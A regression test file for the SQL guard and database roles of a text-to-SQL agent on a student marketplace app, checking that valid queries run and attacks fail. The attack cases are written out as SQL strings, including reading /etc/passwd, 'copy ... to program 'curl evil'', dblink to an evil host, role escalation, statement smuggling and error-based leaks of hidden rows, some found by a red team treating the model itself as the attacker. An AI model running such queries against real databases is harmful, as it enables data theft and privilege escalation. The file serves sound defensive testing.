// Security checks for the text-to-SQL agent's query path (guard + nlq_agent login).
//
//   npm run test:agent-guard
//
// Legitimate queries must run; every attack must be refused, by the guard and,
// for the ones that reach it, by the database. Changes nothing.

import { fileURLToPath } from "node:url";
import pg from "pg";
import { runSelect, closePool } from "../src/lib/agent/db.ts";

process.loadEnvFile(fileURLToPath(new URL("../.env.local", import.meta.url)));

let failures = 0;
function report(pass, label, detail) {
  if (!pass) failures++;
  console.log(`${pass ? "PASS" : "FAIL"}  ${label}${detail ? `  ->  ${detail}` : ""}`);
}

async function allowed(label, role, sql, params) {
  const r = await runSelect(sql, role, params);
  report(r.ok, label, r.ok ? `${r.rowCount} rows${r.truncated ? " (truncated)" : ""}` : r.error);
}

async function refused(label, role, sql) {
  const r = await runSelect(sql, role);
  report(!r.ok, label, r.ok ? `RAN: ${JSON.stringify(r.rows.slice(0, 1))}` : r.error.slice(0, 110));
}

console.log("Legitimate queries");
await allowed("student: cheapest listings", "nlq_student", "select title, sale_price from nlq.listings where sale_price is not null order by sale_price limit 5;");
await allowed("student: unqualified view + calendar join", "nlq_student", "select c.semester, count(*) from listings l join calendar c on c.day = (l.listed_at at time zone 'America/New_York')::date group by 1");
await allowed("admin: late rentals in spring move-out", "nlq_admin", "select count(*) from nlq.deals d join nlq.calendar c on c.day = d.rental_due_date where d.deal_type = 'rental' and d.returned_late and c.period = 'move-out' and c.academic_year = '2024-25'");
await allowed("admin: CTE + window function", "nlq_admin", "with m as (select date_trunc('month', listed_on) as month, count(*) n from nlq.listings_all group by 1) select month, n, lag(n) over (order by month) from m order by month");
await allowed("admin: extract / substring / position / trim / like escape", "nlq_admin", "select extract(year from listed_on), substring(title from 1 for 10), position('a' in title), trim(title) from nlq.listings_all where title like '%!%%' escape '!' limit 3");
await allowed("admin: generate_series date spine", "nlq_admin", "select d::date, count(l.item_id) from generate_series('2025-01-01'::date, '2025-01-07', interval '1 day') d left join nlq.listings_all l on l.listed_on = d::date group by 1 order by 1");
await allowed("admin: row cap (truncates at 200)", "nlq_admin", "select item_id from nlq.listings_all");
await allowed("admin: trailing comment", "nlq_admin", "select count(*) from nlq.reviews -- total reviews");
await allowed("student: parameter", "nlq_student", "select name from nlq.meetup_spots where name ilike $1", ["%curry%"]);

console.log("\nAttacks");
await refused("drop table", "nlq_admin", "drop table nlq.calendar");
await refused("delete", "nlq_admin", "delete from nlq.calendar");
await refused("two statements", "nlq_admin", "select 1; delete from nlq.calendar");
await refused("set transaction read write", "nlq_admin", "set transaction read write");
await refused("set role", "nlq_admin", "set role postgres");
await refused("set_config role", "nlq_admin", "select set_config('role', 'postgres', true)");
await refused("current_setting leak", "nlq_admin", "select current_setting('data_directory')");
await refused("pg_sleep", "nlq_admin", "select pg_sleep(30)");
await refused("pg_read_file", "nlq_admin", "select pg_read_file('/etc/passwd')");
await refused("dblink", "nlq_admin", "select * from dblink('host=evil', 'select 1') as t(x int)");
await refused("auth.users", "nlq_admin", "select email from auth.users");
await refused("public.profiles (names)", "nlq_admin", "select name from public.profiles");
await refused("catalog: pg_roles", "nlq_admin", "select * from pg_catalog.pg_roles");
await refused("catalog unqualified: pg_user", "nlq_admin", "select * from pg_user");
await refused("ops.agent_runs", "nlq_admin", "select * from ops.agent_runs");
await refused("app write function", "nlq_admin", "select public.remove_listing(1)");
await refused("app write function, unqualified", "nlq_admin", "select remove_listing(1)");
await refused("data-modifying CTE", "nlq_admin", "with d as (delete from nlq.calendar returning *) select count(*) from d");
await refused("select into (creates a table)", "nlq_admin", "select * into nlq.stolen from nlq.deals");
await refused("for update (locks rows)", "nlq_admin", "select * from nlq.calendar for update");
await refused("copy to program", "nlq_admin", "copy (select 1) to program 'curl evil'");
await refused("explain analyze", "nlq_admin", "explain analyze select 1");
await refused("student reads admin view", "nlq_student", "select count(*) from nlq.deals");
await refused("student reads admin view in subquery", "nlq_student", "select (select count(*) from nlq.reviews)");
await refused("set-returning function in FROM", "nlq_admin", "select * from pg_ls_dir('.') as t(x)");
await refused("comment smuggling a second statement", "nlq_admin", "select 1 /* ; */ ; drop table nlq.calendar");

console.log("\nMade-up columns (rejected before running)");
await refused("alias.column that doesn't exist", "nlq_student", "select l.price from nlq.listings l");
await refused("view.column that doesn't exist", "nlq_admin", "select deals.buyer_name from nlq.deals");
await allowed("real qualified columns", "nlq_admin", "select l.title, s.name from nlq.listings_all l join nlq.meetup_spots s on s.spot_id = l.spot_id limit 3");

console.log("\nTime zones (UTC timestamps must be converted before taking the date)");
await refused("timestamptz::date (alias)", "nlq_admin", "select avg(r.resolved_at::date - r.filed_on) from nlq.reports r");
await refused("cast(timestamptz as date)", "nlq_student", "select count(*) from nlq.listings where cast(listed_at as date) = '2025-04-21'");
await allowed("converted to Boston first", "nlq_admin", "select avg((resolved_at at time zone 'America/New_York')::date - filed_on) from nlq.reports where resolved_at is not null");
await allowed("date column cast is fine", "nlq_admin", "select count(*) from nlq.deals where rental_due_date::date > '2025-01-01'");

console.log("\nPrivate details in results");
{
  const r = await runSelect("select 'reach me at bob.smith@example.com or (617) 555-0123, ig @bobsells' as t", "nlq_student");
  const text = r.ok ? r.rows[0].t : r.error;
  report(r.ok && !/example\.com|555-0123|@bobsells/.test(text), "emails, phone numbers and handles are masked", text);
}

console.log("\nStudents' own data (my_* views)");
{
  const admin = new pg.Client({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
  await admin.connect();
  // A: the busiest student; B: the busiest one with at least one deal A wasn't part of
  // (load-test accounts can trade only with each other)
  const { rows: [a] } = await admin.query(
    "with u as (select buyer_id as id from nlq.deals union all select seller_id from nlq.deals) select id::text, count(*)::int as n from u group by id order by 2 desc limit 1",
  );
  const { rows: [b] } = await admin.query(
    `with u as (select buyer_id as id, deal_id, seller_id as other from nlq.deals union all select seller_id, deal_id, buyer_id from nlq.deals)
     select id::text, count(*)::int as n from u where id <> $1::uuid group by id having bool_or(other <> $1::uuid) order by 2 desc limit 1`,
    [a.id],
  );
  const { rows: [{ deal_id: bDeal }] } = await admin.query(
    "select deal_id from nlq.deals where $1::uuid in (buyer_id, seller_id) and $2::uuid not in (buyer_id, seller_id) limit 1",
    [b.id, a.id],
  );
  await admin.end();

  const count = async (userId) => {
    const r = await runSelect("select count(*)::int as n from nlq.my_deals", "nlq_student", [], { userId });
    return r.ok ? r.rows[0].n : r.error;
  };
  const [na, nb, none] = [await count(a.id), await count(b.id), await count(null)];
  report(na === a.n, "student A sees exactly their own deals", `${na} of ${a.n}`);
  report(nb === b.n, "student B sees exactly their own deals", `${nb} of ${b.n}`);
  report(none === 0, "nobody signed in: my_deals is empty", String(none));
  const probe = await runSelect(
    `select count(*) from nlq.my_deals where 1 / (case when deal_id = ${bDeal} then 0 else 1 end) = 1`,
    "nlq_student", [], { userId: a.id },
  );
  report(probe.ok, "A probing one of B's deals with a divide-by-zero filter learns nothing", probe.ok ? "no error raised" : probe.error);
  await refused("model sets its own user id", "nlq_student", `select set_config('app.user_id', '${b.id}', true)`);
  await refused("model reads the user id", "nlq_student", "select current_setting('app.user_id', true)");
}

// Found by the rogue-model red team (scripts/redteam-assistant.mjs); fixed in migration 0011,
// guard.ts, db.ts and privacy.ts
console.log("\nRed-team regressions");
{
  const admin = new pg.Client({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
  await admin.connect();
  const { rows: [hidden] } = await admin.query(
    "select item_id, title, description from nlq.listings_all where status in ('sold', 'removed', 'rented_out') and length(title) > 3 order by item_id limit 1",
  );
  const { rows: barrier } = await admin.query(
    "select c.relname from pg_class c where c.relnamespace = 'nlq'::regnamespace and c.relname in ('listings', 'meetup_spots', 'categories') and not coalesce(c.reloptions @> array['security_barrier=true'], false)",
  );
  report(!barrier.length, "student-visible views are security barriers", barrier.length ? `missing: ${barrier.map((r) => r.relname).join(", ")}` : "listings, meetup_spots, categories");

  // A cheap erroring predicate must never run on rows the view filters out (sold/removed listings)
  for (const [label, sql] of [
    ["title::boolean on a sold listing (error would quote its title)", `select count(*) from nlq.listings where item_id = ${hidden.item_id} and title::boolean`],
    ["description::boolean on a sold listing", `select count(*) from nlq.listings where item_id = ${hidden.item_id} and description::boolean`],
    ["cast(title as int) on a sold listing", `select count(*) from nlq.listings where item_id = ${hidden.item_id} and cast(title as int) = 1`],
    ["cast error in a join condition", `select count(*) from nlq.listings l join nlq.categories c on c.category = l.category and l.item_id = ${hidden.item_id} and l.title::boolean`],
  ]) {
    const r = await runSelect(sql, "nlq_student");
    const leaked = !r.ok && (r.error.includes(hidden.title) || (hidden.description && r.error.includes(hidden.description.slice(0, 40))));
    report(!leaked, `error-based read through nlq.listings: ${label}`, r.ok ? `${r.rows[0].count} rows, no error` : r.error.slice(0, 110));
  }

  // Database errors can quote values: masked like results
  const e = await runSelect("select count(*) from nlq.categories where 'write to bob.smith@example.com or (617) 555-0123'::boolean", "nlq_student");
  report(!e.ok && !/example\.com|555-0123/.test(e.error), "database error messages are scrubbed", e.ok ? "RAN" : e.error);

  // Function calls without a FuncCall node
  await refused("attribute notation alias.to_json on a subquery", "nlq_student", "select x.to_json from (select title from nlq.listings limit 1) x");
  await refused("attribute notation alias.row_to_json on a view", "nlq_student", "select s.row_to_json from nlq.my_deals s");
  await refused("field selection (row).f1", "nlq_student", "select (row(1, 2)).f1");
  await refused("field selection (alias).*", "nlq_admin", "select (t).* from nlq.listings_all t");
  await allowed("array subscripts still work", "nlq_admin", "select (a)[1] from (select array[1, 2] as a) x");

  // Every function attribute notation could reach is on the guard's list (catches Postgres upgrades)
  const { ATTRIBUTE_FUNCTIONS } = await import("../src/lib/agent/guard.ts");
  const { rows: reachable } = await admin.query(`
    select distinct p.proname
    from pg_proc p join pg_type t on t.oid = p.proargtypes[0]
    where p.pronargs = 1 and p.prokind = 'f' and p.pronamespace in ('pg_catalog'::regnamespace, 'nlq'::regnamespace)
      and t.typtype in ('c', 'p')
      and t.typname not in ('internal', 'cstring', 'trigger', 'event_trigger', 'language_handler', 'fdw_handler', 'index_am_handler', 'tsm_handler', 'table_am_handler')
      and has_function_privilege('nlq_student', p.oid, 'execute')`);
  const missing = reachable.map((r) => r.proname).filter((n) => !ATTRIBUTE_FUNCTIONS.has(n));
  report(!missing.length, "guard knows every function reachable through attribute notation", missing.length ? `missing: ${missing.join(", ")}` : `${reachable.length} functions`);
  await admin.end();
}

console.log("\nStudent-only login (nlq_agent_student, migration 0011)");
if (!process.env.NLQ_STUDENT_DATABASE_URL) {
  report(false, "NLQ_STUDENT_DATABASE_URL is set", "missing: student questions would run as nlq_agent");
} else {
  const who = await runSelect("select session_user as login, current_user as role", "nlq_student");
  report(who.ok && who.rows[0].login === "nlq_agent_student" && who.rows[0].role === "nlq_student", "student queries run on the nlq_agent_student login", who.ok ? JSON.stringify(who.rows[0]) : who.error);
  const adminWho = await runSelect("select session_user as login, current_user as role", "nlq_admin");
  report(adminWho.ok && adminWho.rows[0].login === "nlq_agent" && adminWho.rows[0].role === "nlq_admin", "admin queries run on the nlq_agent login", adminWho.ok ? JSON.stringify(adminWho.rows[0]) : adminWho.error);

  const s = new pg.Client({ connectionString: process.env.NLQ_STUDENT_DATABASE_URL, ssl: { rejectUnauthorized: false } });
  await s.connect();
  const attempt = async (label, statements, expectOk) => {
    try {
      await s.query("begin read only");
      let last;
      for (const q of statements) last = await s.query(q);
      report(expectOk, label, expectOk ? `${last.rows.length} rows` : `RAN: ${JSON.stringify(last.rows[0])}`);
    } catch (err) {
      report(!expectOk, label, err.message.slice(0, 110));
    } finally {
      await s.query("rollback").catch(() => {});
    }
  };
  await attempt("nlq_agent_student: set role nlq_admin is refused", ["set local role nlq_admin", "select count(*) from nlq.deals"], false);
  await attempt("nlq_agent_student: set_config('role', 'nlq_admin') is refused", ["select set_config('role', 'nlq_admin', true)", "select count(*) from nlq.deals"], false);
  await attempt("nlq_agent_student: set role postgres is refused", ["set local role postgres"], false);
  await attempt("nlq_agent_student: reads nothing before switching (noinherit)", ["select count(*) from nlq.listings"], false);
  await attempt("nlq_agent_student as nlq_student: admin views are refused", ["set local role nlq_student", "select count(*) from nlq.deals"], false);
  await attempt("nlq_agent_student as nlq_student: listings work", ["set local role nlq_student", "select title from nlq.listings limit 3"], true);
  await attempt("nlq_agent_student: writes are refused", ["set local role nlq_student", "select set_config('app.user_id', '', true)", "set transaction read write"], false);
  await s.end();

  // my_* scoping through the student login
  const admin = new pg.Client({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
  await admin.connect();
  const { rows: [top] } = await admin.query(
    "with u as (select buyer_id as id from nlq.deals union all select seller_id from nlq.deals) select id::text, count(*)::int as n from u group by id order by 2 desc limit 1",
  );
  await admin.end();
  const mine = await runSelect("select count(*)::int as n from nlq.my_deals", "nlq_student", [], { userId: top.id });
  report(mine.ok && mine.rows[0].n === top.n, "my_* scoping works on the student login", mine.ok ? `${mine.rows[0].n} of ${top.n}` : mine.error);
}

console.log("\nDatabase layer alone (guard bypassed on purpose)");
const db = new pg.Client({ connectionString: process.env.NLQ_DATABASE_URL, ssl: { rejectUnauthorized: false } });
await db.connect();
for (const [label, sql] of [
  ["app write function inside the locked read-only transaction", "select public.remove_listing(1)"],
  ["read-write switch after the lock query", "set transaction read write"],
]) {
  try {
    await db.query("begin read only");
    await db.query("set local role nlq_admin");
    await db.query("select 1");
    await db.query(sql);
    report(false, label, "RAN");
  } catch (e) {
    report(true, label, e.message.slice(0, 110));
  } finally {
    await db.query("rollback").catch(() => {});
  }
}
// The leaky-view read with no guard at all: only the security barrier stands in the way
{
  const a = new pg.Client({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
  await a.connect();
  const { rows: [hidden] } = await a.query("select item_id, title from nlq.listings_all where status = 'sold' and length(title) > 3 order by item_id limit 1");
  await a.end();
  let outcome;
  try {
    await db.query("begin read only");
    await db.query("set local role nlq_student");
    const r = await db.query(`select count(*)::int as n from nlq.listings where item_id = ${hidden.item_id} and title::boolean`);
    outcome = { leaked: false, detail: `${r.rows[0].n} rows, no error` };
  } catch (e) {
    outcome = { leaked: e.message.includes(hidden.title), detail: e.message.slice(0, 110) };
  } finally {
    await db.query("rollback").catch(() => {});
  }
  report(!outcome.leaked, "sold listing's title can't be read through an error in nlq.listings (security barrier)", outcome.detail);
}
await db.end();
await closePool();

console.log(failures ? `\n${failures} check(s) FAILED` : "\nAll checks passed");
process.exitCode = failures ? 1 : 0;
